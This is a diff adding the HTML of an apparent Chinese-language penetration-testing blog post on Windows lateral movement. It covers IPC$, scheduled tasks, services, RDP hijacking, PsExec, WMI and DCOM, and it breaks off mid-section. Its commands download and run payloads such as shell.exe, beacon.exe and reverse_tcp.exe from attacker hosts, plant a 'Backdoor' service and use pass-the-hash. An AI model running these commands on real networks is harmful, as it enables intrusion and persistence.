@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="内网横向移动">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网横向移动">
+<meta property="og:url" content="https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="killeveee">
+<meta property="og:description" content="内网横向移动">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-12-27T07:11:33.000Z">
+<meta property="article:modified_time" content="2023-12-27T13:35:11.222Z">
+<meta property="article:author" content="killeveee">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>内网横向移动</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/12/23/Windows%E6%8F%90%E6%9D%83%EF%BC%88%E4%B8%8A%EF%BC%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&text=内网横向移动"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网横向移动"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&is_video=false&description=内网横向移动"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网横向移动&body=Check out this article: https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网横向移动"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网横向移动"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网横向移动"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网横向移动"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&name=内网横向移动&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://killeveee.github.io/archives/2023/12/27/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&t=内网横向移动"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">网络共享</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">文件传输</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">执行程序或命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.2.</span> <span class="toc-text">系统服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">RDP远程桌面协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">PsExec远程管理工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">WMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">DCOM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.1.</span> <span class="toc-text">MMC20.Application</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.2.</span> <span class="toc-text">ShellWindows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.3.</span> <span class="toc-text">Excel.Application</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.4.</span> <span class="toc-text">ShellBrowserWindow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">7.5.</span> <span class="toc-text">Impacket里的dcomexec.py脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">WinRM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.1.</span> <span class="toc-text">通过WinRM执行远程命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.2.</span> <span class="toc-text">Evil-Winrm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">PTH哈希传递</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        内网横向移动
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">killeveee</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-27T07:11:33.000Z" class="dt-published" itemprop="datePublished">2023-12-27</time>
+        
+      
+    </div>
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2><span id="网络共享">网络共享</span></h2><p>Windows网络共享功能，<code>net share</code>命令列出默认开启的网络共享。<code>C$</code>即C盘共享，<code>ADMIN$</code>是系统目录共享。还有一个最重要的<code>IPC$</code>共享。<br><strong>进程间通信</strong>（Inter-Process Communication，简称<strong>IPC</strong>），为了让进程间通信而开放的命名管道。通过用户名密码建立安全的通道进行数据交换。<br>实战中往往建立ipc$连接，因为可以列出远程主机进程、在远程主机创建计划任务或系统服务……<br>建立<code>IPC$</code>连接条件：远程主机开启了ipc连接，端口139、445开放。</p>
+<blockquote>
+<p>因为IPC$连接通常通过SMB协议进行，而SMB协议使用TCP端口139和445。</p>
+</blockquote>
+<h2><span id="文件传输">文件传输</span></h2><p>测试人员往往需要预先制定好文件传输方案，以便在后续操作过程中向目标主机部署攻击载荷或其他文件。<br>1、<strong>文件上传</strong><br>利用跳板机，将 文件 上传 给 目标主机。</p>
+<blockquote>
+<p>利用方法：IPC连接配合copy命令</p>
+</blockquote>
+<ol>
+<li><p><strong>建立IPC链接</strong>到目标主机</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net use \\192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>21\ipc$ <span class="token string">"Admin12345"</span> <span class="token operator">/</span>user:god<span class="token punctuation">.</span>org\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p><strong>拷贝</strong>要执行的命令脚本到目标主机</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">copy</span> 5555<span class="token punctuation">.</span>exe \\192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>21\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<p>2、<strong>文件下载</strong><br>若可以在目标主机上执行命令，则可使用以下方式 直接下载文件。<br>以下是Windows自带的文件下载工具：</p>
+<ol>
+<li>Certutil（常用）</li>
+</ol>
+<p>Certutil 是Windows自带的命令行工具，用于管理Windows证书并作为证书服务器的一部分安装。Certutil提供了从网络下载文件的功能。（需要一个web服务器存放要下载的文件。</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">certutil<span class="token punctuation">.</span>exe <span class="token operator">-</span>urlcache <span class="token operator">-</span>split <span class="token operator">-</span>f http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>22/6666<span class="token punctuation">.</span>exe 6666<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="2">
+<li>BITSAdmin</li>
+</ol>
+<p>BITSAdmin用于创建、下载和上传作业，监视其进度。<br>Windows7及以后的系统自带BitsAdmin工具。</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">bitsadmin <span class="token operator">/</span>transfer test http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1:8000/shell<span class="token punctuation">.</span>exe c:\users\public\shell<span class="token punctuation">.</span>exe
+<span class="token comment"># 创建一个名为test的bitsadmin任务，下载shell.exe</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ol start="3">
+<li>PowerShell</li>
+</ol>
+<p>在Powershell中通过创建WebClient对象来实现文件下载：</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadFile<span class="token punctuation">(</span><span class="token string">"http://192.168.1.1:8000/shell.exe"</span><span class="token punctuation">,</span> <span class="token string">"c:\users\public\shell.exe"</span><span class="token punctuation">)</span>
+或
+powershell <span class="token operator">-</span>c <span class="token string">"(New-Object Net.WebClient).DownloadFile('http://192.168.1.1:8000/shell.exe','c:\users\public\shell.exe')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2><span id="执行程序或命令">执行程序或命令</span></h2><p>文件传输到目标主机后，可以利用以下方式运行攻击载荷，或者执行其他命令。</p>
+<h3><span id="计划任务">计划任务</span></h3><p>1）通过建立的IPC连接，通过copy命令将攻击载荷上传后，在远程主机上创建计划任务，运行攻击载荷，或者执行其他命令，或者将执行的命令的结果保存在文本中用<code>type</code>读取。</p>
+<pre><code>  1. `at`命令
+</code></pre>
+<p>版本要求：&lt;Windows2012<br>建立ipc连接，然后把执行文件copy上去，再使用at命令添加计划任务。</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">at \\10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1\ 11:30 C:\hh<span class="token punctuation">.</span>bat
+at \\10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1    1 <span class="token operator">/</span>delete	<span class="token comment"># 1为计划任务的ID</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre><code>  2. `schtasks`命令
+</code></pre>
+<p>版本要求：&gt;&#x3D;windows2012<br>建立ipc连接，然后把执行文件copy上去，再使用schtasks命令添加计划任务。</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 在10.1.1.1创建任务名为adduser，每天执行的，文件路径为C:\add.bat的任务</span>
+schtasks <span class="token operator">/</span>create <span class="token operator">/</span>s 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 <span class="token operator">/</span>ru <span class="token string">"SYSTEM"</span> <span class="token operator">/</span>tn adduser <span class="token operator">/</span><span class="token function">sc</span> DAILY <span class="token operator">/</span>tr C:\add<span class="token punctuation">.</span>bat <span class="token operator">/</span>F	<span class="token comment"># 已建立ipc连接的情况下使用</span>
+schtasks <span class="token operator">/</span>create <span class="token operator">/</span>s 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 <span class="token operator">/</span>ru <span class="token string">"SYSTEM"</span> <span class="token operator">/</span>tn adduser <span class="token operator">/</span><span class="token function">sc</span> DAILY <span class="token operator">/</span>tr C:\add<span class="token punctuation">.</span>bat <span class="token operator">/</span>F <span class="token operator">/</span>U Administrator <span class="token operator">/</span>P Admin12345	<span class="token comment"># 若没有建立ipc连接，需要手动指定用户密码</span>
+
+schtasks <span class="token operator">/</span>run <span class="token operator">/</span>s 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 <span class="token operator">/</span>tn adduser <span class="token operator">/</span>i		<span class="token comment"># 立即启动adduser任务</span>
+schtasks <span class="token operator">/</span>delete <span class="token operator">/</span>s 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 <span class="token operator">/</span>tn adduser <span class="token operator">/</span>f	<span class="token comment"># 删除adduser任务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>2）除了ipc连接外，还可使用自行搭建的<strong>SMB匿名服务器</strong>。使用<code>UNC路径</code>代替本地路径，让远程主机直接在搭建的SMB共享中加载并执行攻击载荷。比ipc的好处就是<strong>省去了文件上传</strong>。<br>SMB（文件共享CIFS）搭建：<br>在linux上，可以通过<code>impacket</code>套件里的 <a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/impacket/smbserver.py">smbserver.py </a>来搭建smb服务器。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /root/smbshare
+python3 smbserver.py mysmb /root/smbshare -smb2support<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>然后执行以下命令，创建计划任务，注意这里使用的是UNC路径，因为没有建立ipc连接，也需要手动指定用户密码。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">schtasks /Create /S <span class="token number">10.1</span>.1.1 /TN Backdoor /SC minute /MO <span class="token number">1</span> /TR <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.3.15<span class="token punctuation">\</span>mysmb<span class="token punctuation">\</span>reverse_tcp.exe /RU System /F /U Administrator /P Admin12345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以看到以上两种方法都是明文密码，但是我们信息搜集的时候可能会得到hash值，hash值可以使用<code>impacket</code>里的<code>atexec</code>工具进行hash传递。</p>
+<h3><span id="系统服务">系统服务</span></h3><p>1、<code>sc</code>命令，创建系统服务，运行指定的程序或命令。</p>
+<blockquote>
+<p>条件：要有2端主机的管理员权限、ipc连接</p>
+</blockquote>
+<p>上传攻击载荷后，利用已建立的IPC$连接在远程主机上创建系统服务：</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">sc</span> \\10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>19 create Backdoor binPath= <span class="token string">"cmd.exe /k C:\reverse_tcp.exe"</span>	<span class="token comment"># 创建名为Backdoor的服务，服务启动时执行指定命令。注意，= 后面有个空格</span>
+<span class="token function">sc</span> \\10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>19 <span class="token function">start</span> Backdoor  	<span class="token comment"># 启动服务</span>
+<span class="token function">sc</span> \\10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>19 delete Backdoor  <span class="token comment"># 删除服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>2、<code>SCShell</code>工具，是一款利用系统服务的无文件横向移动工具。</p>
+<blockquote>
+<p>通过<code>ChangeServiceConfigA API</code>修改服务配置，将二进制路径修改为指定的程序或攻击载荷，然后重启服务，执行结束后，服务二进制路径将会恢复为原始路径。</p>
+</blockquote>
+<p>用MSF启动一个Web Delivery，并生成用于Regsvr32执行的Payload。<br>然后在远程主机上执行：</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">SCShell<span class="token punctuation">.</span>exe 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>197<span class="token punctuation">.</span>131 XblAuthManager <span class="token string">"C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll"</span> hack<span class="token punctuation">.</span>com administrastor Admin12345 
+<span class="token comment"># XblAuthManager 是 Xbox Accessory Management Service的服务名</span>
+<span class="token comment"># 格式：</span>
+<span class="token comment">#SCShell.exe &lt;target> &lt;serviceName> &lt;payload> &lt;domain> &lt;username> &lt;password></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2><span id="rdp远程桌面协议">RDP远程桌面协议</span></h2><p>远程桌面协议RDP，端口TCP 3389<br>可以通过获取的用户凭据，借助代理，通过远程桌面对目标进行实时操作。<br>但可能会把已登录的用户强制退出。<br>1、开启RDP</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">REG ADD <span class="token string">"HKLM\System\CurrentControlSet\Control\Lsa"</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>2、RDP Hijacking劫持<br>当多个用户进行登录时，会产生多个会话，我们可以通过已经获取的SYSTEM权限劫持其他用户的RDP会话，在未授权的情况下登入。<br><code>tscon</code>命令可以切换用户会话。正常情况下切换会话需要提供用户密码验证，但是在SYSTEM权限下能完全绕过验证。不验证就能登录，实现未授权登录。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">query user	<span class="token comment"># 查询会话记录</span>
+tscon <span class="token operator">&lt;</span>ID<span class="token operator">></span>	<span class="token comment"># 切换会话，会话id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>3、工具<code>SharpRDP</code><br>提供RDP协议在远程主机执行命令，省去了 内网代理 和 GUI登录。<br>条件：开启远程桌面、防火墙3389开放</p>
+<h2><span id="psexec远程管理工具">PsExec远程管理工具</span></h2><p>PsExec是微软官方工具，用来实现Windows远程管理。<br>原理：SMB连接Admin$共享，并释放名为psexesvc.exe的二进制文件，然后注册名字为PSEXESVC的服务。当我们输入远程命令时，会通过PSEXESVC服务启动相应程序执行命令并回显数据。运行结束，PSEXESVC被删除。<br>条件：开启Admin$共享，445端口(SMB)开放</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PsExec.exe <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.3.21 -u administrator -p Admin12345 -s cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><code>Impacket</code>套件和<code>Metasploit</code>都内置了PsExec的脚本或模块。</p>
+<h2><span id="wmi">WMI</span></h2><p>WMI 是一套用于监控和<strong>管理</strong> Windows 操作系统的服务。了解操作系统的状态。<br>可以管理本地和远程，远程传输WMI数据有2个协议：DCOM、WinRM<br>WMI的2种利用方式：</p>
+<ol>
+<li>WMI的类方法进行远程命令执行</li>
+<li>部署WMI事件订阅</li>
+</ol>
+<p>一、命令执行<br>1、自带wmic<br>内部：(单执行)</p>
+<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.3.21 &#x2F;user:administrator &#x2F;password:Admin12345 process call create &quot;cmd.exe &#x2F;c certutil -urlcache -split -f http:&#x2F;&#x2F;192.168.3.22&#x2F;5555.exe c:&#x2F;5555.exe&quot;
+ 
+wmic &#x2F;node:192.168.3.32 &#x2F;user:administrator &#x2F;password:admin!@#45 process call create &quot;cmd.exe &#x2F;c c:&#x2F;beacon.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>2、wmiexec.vbs<br>内置：(交互式)<br>上传wmiexec.vbs</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cscript //nologo wmiexec.vbs /shell <span class="token number">192.168</span>.3.21 administrator Admin12345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>3、wmiexec<br>外部：(交互式&amp;单执行)</p>
+<pre class="line-numbers language-none"><code class="language-none">wmiexec .&#x2F;administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
+wmiexec god&#x2F;administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
+ 
+wmiexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;administrator@192.168.3.21 &quot;whoami&quot;
+ 
+下载后门：
+wmiexec .&#x2F;administrator:Admin12345@192.168.3.21 &quot;cmd.exe &#x2F;c certutil -urlcache -split -f http:&#x2F;&#x2F;192.168.3.31&#x2F;beacon.exe c:&#x2F;beacon.exe&quot;
+ 
+执行后门：
+wmiexec .&#x2F;administrator:Admin12345@192.168.3.21 &quot;cmd.exe &#x2F;c c:&#x2F;beacon.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>二、WMI事件订阅<br>当创建进程时，通过WMI事件订阅来执行预先设置的脚本。</p>
+<ul>
+<li>事件过滤器（Event Filter）：触发事件的具体条件</li>
+<li>事件消费者（Event Consumer）：触发后的一系列操作</li>
+</ul>
+<p>在部署事件订阅时，需要分别构建Filter和Consumer两部分，并绑定在一起。<br>利用工具<code>Sharp-WMIEvent</code>：<a target="_blank" rel="noopener" href="https://github.com/wh0amitz/Sharp-WMIEvent">https://github.com/wh0amitz/Sharp-WMIEvent</a></p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 先搭建一个SMB共享服务器</span>
+<span class="token comment"># 然后执行下面命令，在主机上部署一个随机命名的永久事件订阅，每60s执行一次</span>
+Sharp-WMIEvent <span class="token operator">-</span>Trigger Interval <span class="token operator">-</span>IntervalPeriod 60 <span class="token operator">-</span>ComputerName 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>220<span class="token punctuation">.</span>130 <span class="token operator">-</span>Domain hack<span class="token punctuation">.</span>com <span class="token operator">-</span>Username Administrator <span class="token operator">-</span>Password Admin12345 <span class="token operator">-</span>Command <span class="token string">"cmd.exe /c \\192.168.220.132\evilsmb\shell.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2><span id="dcom">DCOM</span></h2><p>COM 组件对象模型<br>DCOM 分布式组件对象模型<br>COM（Component Object Model，组件对象模型）是微软的一套软件组成的二进制接口标准，使得跨编程语言的进程间通信、动态对象创建成为可能。COM指定了一个对象模型和编程要求，使COM对象能够与其他对象交互。这些对象可以在单个进程中，也可以在其它进程中，甚至可以在远程计算机中。在Windows中，每个COM对象都由唯一的128位的二进制标识符标识，即GUID。<br>DCOM（Distracted Component Model，分布式组件对象模型）是基于COM的一系列概念和程序接口，支持不同机器上的组件间通信。利用DCOM，客户端程序对象可以请求来自网络中另一台计算机上的服务器程序对象。<br>部分DCOM组件公开的接口中可能包含不安全的方法。执行以下命令，可以列出计算机上所有的DCOM程序组件<br> Get-CimInstance Win32_DCOMApplication<br>目前常利用的DCOM组件有：MMC20.Application、ShellWindows、Excel.Application、ShellBrowserWindow等。<br>使用DCOM在远程主机上面执行命令，需要具有以下条件：</p>
+<ul>
+<li>具有管理员权限的PowerShell</li>
+<li>可能需要关闭目标系统的防火墙。</li>
+<li>在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户<h3><span id="mmc20application">MMC20.Application</span></h3>MMC20.Application对象的Document.ActiveView下存在一个ExecuteShellCommand方法，可以用来启动子进程并运行执行的程序或系统命令。<pre class="line-numbers language-none"><code class="language-none"># 通过progID与DCOM进行远程交互，并创建MMC20.Application对象的示例
+ $com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.30.100&quot;))
+ 
+ # 调用ExecuteShellCommand方法启动进程，运行攻击载荷
+ $com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c \\192.168.207.152\mysmb\reverse_tcp.exe&quot;, &quot;Minimized&quot;)
+ 
+ # 合并一句话
+ [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.30.100&quot;)).Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c \\192.168.207.152\mysmb\reverse_tcp.exe&quot;, &quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3><span id="shellwindows">ShellWindows</span></h3>ShellWindows组件提供了Document.Application.ShellExecute方法，适用于Windows7及以上的系统。<pre class="line-numbers language-none"><code class="language-none"># 通过PowerShell与DCOM进行远程交互，创建ShellWindows对象的实例:
+ $com&#x3D;[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.30
+ 
+ .138&quot;))
+ 
+ # 然后执行如下命令，我们就可以调用该对象的&quot;ShellExecute&quot;方法在远程主机上启动进程:
+ $com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c C:\shell.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
+ 
+ # 完整的命令:
